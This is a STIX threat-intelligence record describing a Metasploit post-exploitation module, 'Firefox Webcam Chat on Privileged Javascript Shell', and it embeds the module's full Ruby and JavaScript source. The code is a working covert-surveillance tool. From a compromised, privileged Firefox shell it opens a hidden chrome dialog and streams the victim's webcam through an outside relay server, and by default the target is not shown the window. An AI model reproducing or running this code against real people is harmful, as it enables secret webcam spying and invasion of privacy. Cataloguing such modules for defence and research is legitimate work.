{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c8a4e22-aa3e-4f35-ba78-d67be51ec0fb",
    "created": "2024-08-14T16:33:13.572613Z",
    "modified": "2024-08-14T16:33:13.572617Z",
    "name": "Firefox Webcam Chat on Privileged Javascript Shell",
    "description": " This module allows streaming a webcam from a privileged Firefox Javascript shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/firefox/manage/webcam_chat.rb",
            "external_id": "webcam_chat.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.rapid7.com/db/modules/exploit/firefox/local/exec_shellcode"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'json'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n  include Msf::Post::WebRTC\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Firefox Webcam Chat on Privileged Javascript Shell',\n        'Description' => %q{\n          This module allows streaming a webcam from a privileged Firefox Javascript shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'joev' ],\n        'References' => [\n          [ 'URL', 'http://www.rapid7.com/db/modules/exploit/firefox/local/exec_shellcode' ]\n        ],\n        'DisclosureDate' => '2014-05-13'\n      )\n    )\n\n    register_options([\n      OptBool.new('CLOSE', [false, 'Forcibly close previous chat session', false]),\n      OptBool.new('VISIBLE', [false, 'Show a window containing the chat to the target', false]),\n      OptInt.new('TIMEOUT', [false, 'End the chat session after this many seconds', -1]),\n      OptString.new('ICESERVER', [true, 'The ICE server that sets up the P2P connection', 'wsnodejs.jit.su:80'])\n    ])\n  end\n\n  def run\n    unless os_check\n      print_error 'Windows versions of Firefox are not supported at this time [RM #8810].'\n      return\n    end\n\n    server = datastore['ICESERVER']\n    offerer_id = Rex::Text.rand_text_alphanumeric(10)\n    channel = Rex::Text.rand_text_alphanumeric(20)\n\n    result = js_exec(js_payload(server, offerer_id, channel))\n\n    if datastore['CLOSE']\n      print_status 'Stream closed.'\n    elsif result.present?\n      print_status result\n      connect_video_chat(server, channel, offerer_id)\n    else\n      print_warning 'No response received'\n    end\n  end\n\n  def os_check\n    user_agent = js_exec(%|\n      return Components.classes[\"@mozilla.org/network/protocol;1?name=http\"]\n        .getService(Components.interfaces.nsIHttpProtocolHandler).userAgent;\n    |)\n    user_agent !~ /windows/i\n  end\n\n  def js_payload(server, offerer_id, channel)\n    interface = load_interface('offerer.html')\n    api = load_api_code\n\n    interface.gsub!(/=SERVER=/, server)\n    interface.gsub!(/=CHANNEL=/, channel)\n    interface.gsub!(/=OFFERERID=/, offerer_id)\n\n    if datastore['TIMEOUT'] > 0\n      api << \"; setTimeout(function(){window.location='about:blank'}, #{datastore['TIMEOUT'] * 1000}); \"\n    end\n\n    url = if datastore['CLOSE']\n            '\"about:blank\"'\n          else\n            '\"data:text/html;base64,\"+html'\n          end\n\n    name = if datastore['VISIBLE']\n             Rex::Text.rand_text_alphanumeric(10)\n           else\n             '_self'\n           end\n\n    %|\n      (function(send){\n        try {\n\n          var AppShellService = Components\n             .classes[\"@mozilla.org/appshell/appShellService;1\"]\n             .getService(Components.interfaces.nsIAppShellService);\n\n          var html = \"#{Rex::Text.encode_base64(interface)}\";\n          var url = #{url};\n          AppShellService.hiddenDOMWindow.openDialog(url, '#{name}', 'chrome=1,width=1100,height=600');\n          send(\"Streaming webcam...\");\n\n        } catch (e) {\n          send(e);\n        }\n      })(this.send);\n    |\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-13"
}